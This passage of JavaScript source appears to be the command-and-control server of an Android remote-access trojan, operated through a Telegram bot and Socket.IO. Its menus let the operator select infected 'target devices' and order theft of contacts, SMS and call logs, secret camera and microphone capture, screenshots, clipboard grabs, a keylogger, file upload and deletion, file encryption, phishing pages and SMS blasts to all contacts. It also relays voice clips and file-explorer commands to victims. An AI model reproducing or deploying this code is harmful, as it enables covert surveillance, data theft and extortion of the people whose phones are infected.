        if (message.text === '✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯') {
            appData.set('currentAction', 'recordVoice')
            bot.sendMessage(data.id,
                "<b>✯ 𝚁𝚎𝚌𝚘𝚛𝚍 𝚟𝚘𝚒𝚌𝚎 𝚝𝚘 𝚙𝚕𝚊𝚢 𝚘𝚗 𝚝𝚊𝚛𝚐𝚎𝚝 𝚍𝚎𝚟𝚒𝚌𝚎</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
                        "resize_keyboard": true,
                        "one_time_keyboard": true
                    }
                }
            )
        }
    } else {
        io.sockets.sockets.forEach((value, key, map) => {
            if (message.text === value.model) {
                appData.set("currentTarget", key)
                bot.sendMessage(data.id,
                    `<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 ${value.model}</b>\n\n`,
                    {
                        parse_mode: "HTML",
                        "reply_markup": {
                            "keyboard": [
                                ["✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝚂𝙼𝚂 ✯"],
                                ["✯ 𝙲𝚊𝚕𝚕𝚜 ✯", "✯ 𝙰𝚙𝚙𝚜 ✯"],
                                ["✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯"],
                                ["✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯"],
                                ["✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯", "✯ 𝚃𝚘𝚊𝚜𝚝 ✯"],
                                ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯"],
                                ["✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯"],
                                ["✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯"],
                                ["✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯"],
                                ["✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯"],
                                ["✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯", "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯"],
                                ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯",],
                                ["✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯",],
                                ["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"],
                            ],
                            "resize_keyboard": true,
                            "one_time_keyboard": true
                        }
                    }
                )
            }
        })
        if (message.text == "✯ 𝙰𝚕𝚕 ✯") {
            appData.set("currentTarget", "all")
            bot.sendMessage(data.id,
                `<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜</b>\n\n`,
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝚂𝙼𝚂 ✯"],
                            ["✯ 𝙲𝚊𝚕𝚕𝚜 ✯", "✯ 𝙰𝚙𝚙𝚜 ✯"],
                            ["✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯"],
                            ["✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯"],
                            ["✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯", "✯ 𝚃𝚘𝚊𝚜𝚝 ✯"],
                            ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯"],
                            ["✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯"],
                            ["✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯"],
                            ["✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯"],
                            ["✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯"],
                            ["✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯", "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯"],
                            ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯",],
                            ["✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯",],
                            ["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"],
                        ],
                        "resize_keyboard": true,
                        "one_time_keyboard": true
                    }
                }
            )
        }
    }
})

bot.on("voice", (message) => {
    if (appData.get("currentAction") === "recordVoice") {
        let voiceId = message.voice.file_id
        let target = appData.get("currentTarget")
        bot.getFileLink(voiceId).then((link) => {
            if (target == "all") {
                io.sockets.emit("commend", { "request": "playAudio", "extras": [{ "key": "url", "value": link }] })
            } else {
                io.to(target).emit("commend", { "request": "playAudio", "extras": [{ "key": "url", "value": link }] })
            }
            appData.delete("currentTarget")
            appData.delete("currentAction")
            bot.sendMessage(data.id,
                "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        })
    }
})

bot.on("callback_query", (callbackQuery) => {
    console.log(callbackQuery)
    let callbackQueryData = callbackQuery.data
    let model = callbackQueryData.split('|')[0]
    let commend = callbackQueryData.split('|')[1]
    let request = commend.split('-')[0]
    let name = commend.split('-')[1]
    if (request === 'back') {
        io.sockets.sockets.forEach((value, key, map) => {
            if (value.model === model) {
                io.to(key).emit("file-explorer",
                    { "request": "back", "extras": [] }
                )
            }
        })
    }
    if (request === 'cd') {
        io.sockets.sockets.forEach((value, key, map) => {
            if (value.model === model) {
                io.to(key).emit("file-explorer",
                    { "request": "cd", "extras": [{ "key": "name", "value": name }] }
                )
            }
        })
    }
    if (request === 'upload') {
        io.sockets.sockets.forEach((value, key, map) => {
            if (value.model === model) {
                io.to(key).emit("file-explorer",
                    { "request": "upload", "extras": [{ "key": "name", "value": name }] }
                )
            }
        })
    }
    if (request === 'delete') {
        io.sockets.sockets.forEach((value, key, map) => {
            if (value.model === model) {
                io.to(key).emit("file-explorer",
                    { "request": "delete", "extras": [{ "key": "name", "value": name }] }
                )
            }
        })
    }
    if (request === 'request') {
        bot.editMessageText(`✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚏𝚘𝚛 𝚏𝚒𝚕𝚎 : ${name}`, {
            chat_id: data.id,
            message_id: callbackQuery.message.message_id,
            reply_markup: {
                inline_keyboard: [
                    [{ text: "✯ 𝚄𝚙𝚕𝚘𝚊𝚍 ✯", callback_data: `${model}|upload-${name}` }, {
                        text: "✯ 𝙳𝚎𝚕𝚎𝚝𝚎 ✯",
                        callback_data: `${model}|delete-${name}`
                    }],
                ]
            },
            parse_mode: "HTML"
        });
    }
})

setInterval(() => {
    io.sockets.sockets.forEach((value, key, map) => {
        io.to(key).emit("ping", {})
    })
}, 5000)

setInterval(() => {
    https.get(data.host, (resp) => {
    }).on("error", (err) => {
    })
}, 480000)

// starting server
server.listen(process.env.PORT || 3000, () => {
    console.log('listening on port 3000')
})
